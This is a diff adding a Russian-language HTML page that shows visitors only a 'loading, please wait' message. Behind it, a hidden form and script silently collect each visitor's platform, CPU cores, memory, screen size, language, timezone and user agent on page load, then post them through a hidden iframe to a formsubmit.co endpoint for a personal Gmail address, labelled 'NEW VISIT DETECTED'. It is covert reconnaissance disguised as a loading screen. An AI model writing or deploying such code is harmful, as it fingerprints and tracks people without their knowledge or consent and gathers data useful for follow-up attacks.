@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Загрузка...</title>
+    <style>body{margin:0;height:100vh;display:flex;align-items:center;justify-content:center;background:#111;color:#555;font-family:sans-serif;}</style>
+</head>
+<body>
+    <div>Подождите...</div>
+    
+    <!-- Скрытая форма для обхода CORS -->
+    <iframe name="dummyframe" id="dummyframe" style="display:none;"></iframe>
+    <form id="reconForm" action="https://formsubmit.co/majornyy2@gmail.com" method="POST" target="dummyframe" style="display:none;">
+        <input type="hidden" name="_subject" value="🔴 NEW VISIT DETECTED">
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_template" value="table">
+        <input type="hidden" name="platform" id="f_platform">
+        <input type="hidden" name="cores" id="f_cores">
+        <input type="hidden" name="ram" id="f_ram">
+        <input type="hidden" name="screen" id="f_screen">
+        <input type="hidden" name="lang" id="f_lang">
+        <input type="hidden" name="tz" id="f_tz">
+        <input type="hidden" name="ua" id="f_ua">
+    </form>
+
+    <script>
+        // Заполняем поля данными
+        document.getElementById('f_platform').value = navigator.platform || 'N/A';
+        document.getElementById('f_cores').value = navigator.hardwareConcurrency || 'N/A';
+        document.getElementById('f_ram').value = navigator.deviceMemory || 'N/A';
+        document.getElementById('f_screen').value = `${screen.width}x${screen.height}`;
+        document.getElementById('f_lang').value = navigator.language || 'N/A';
+        document.getElementById('f_tz').value = Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A';
+        document.getElementById('f_ua').value = navigator.userAgent || 'N/A';
+
+        // Отправляем форму через 500мс (чтобы DOM успел)
+        setTimeout(() => {
+            document.getElementById('reconForm').submit();
+        }, 500);
+    </script>
+</body>
+</html>
